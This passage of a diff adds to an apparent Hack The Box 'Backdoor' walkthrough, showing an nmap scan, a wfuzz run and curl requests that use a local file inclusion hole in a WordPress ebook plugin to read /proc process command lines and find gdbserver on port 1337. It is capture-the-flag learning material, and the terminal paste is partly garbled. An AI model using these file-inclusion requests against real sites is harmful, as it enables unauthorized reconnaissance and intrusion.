@@ -257,6 +257,92 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
 <script>window.close()</script>
 ```
+I can see that we have a user name of user, but I can't seem to find anything. I spent about an hour doing more research feeling like I was missing thing something very important. So I decided to reset the box and enumerate further. I found another port open by forcing it to scan all ports.
+
+### NMAP 
+
+```console
+noob2uub@kali:~/Documents/Tools$ sudo nmap -sC -sV -p1-65535 10.10.11.125
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 14:17 PDT
+Nmap scan report for 10.10.11.125
+Host is up (0.038s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Backdoor &#8211; Real-Life
+|_http-generator: WordPress 5.8.1
+1337/tcp open  waste?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.62 seconds
+noob2uub@kali:~/Documents/Tools$ 
+```
+
+I found port 1337, lets look into this. I can't find anything on this except waste means "elite" I spent more time researching LFI and found this resource that had me look into the PID.
+
+https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
+
+So lets use WFUZZ to find out what PIDS I can get. 
+
+### WFUZZ
+
+```console
+noob2uub@kali:~/Documents/Tools$ wfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline
+Total requests: 1000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                             
+=====================================================================
+
+000000861:   200        0 L      8 W        138 Ch      "861"                                                                                               
+000000858:   200        0 L      11 W       181 Ch      "858"                                                                                               
+000000852:   200        0 L      12 W       183 Ch      "852"                                                                                               
+000000902:   200        0 L      3 W        128 Ch      "902"                                                                                               
+
+Total time: 0
+Processed Requests: 1000
+Filtered Requests: 996
+Requests/sec.: 0
+```
+so now lets check out those four PID's
+
+```console
+noob2uub@kali:~/Documents/Tools$ cat test.txt
+/proc/902/cmdline/proc/902/cmdline/proc/902/cmdline/sbin/agetty-o-p -- \u--nocleartty1linux<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ cat test.turl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --output test.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   183  100   183    0     0   2380      0 --:--:-- --:--:-- --:--:--  2376
+noob2uub@kali:~/Documents/Tools$ cat test.txt
+/proc/852/cmdline/proc/852/cmdline/proc/852/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --outpu                                 url http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/858/cmdline --output test.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   181  100   181    0     0   2354      0 --:--:-- --:--:-- --:--:--  2381
+noob2uub@kali:~/Documents/Tools$ cat test.txt
+/proc/858/cmdline/proc/858/cmdline/proc/858/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>noob2uub@kali:~/Documurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/861/cmdline --output test.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   138  100   138    0     0   1803      0 --:--:-- --:--:-- --:--:--  1815
+noob2uub@kali:~/Documents/Tools$ cat test.txt
+/proc/861/cmdline/proc/861/cmdline/proc/861/cmdlinesshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<script>window.close()</script>noob2uub@kali:~/Documents/Tools$                                                                                                        
+```
+
+I see something interested. User is running gdbserver on port 1337. This was the headache port until I reset the box. 
+
+
+
 
 
 
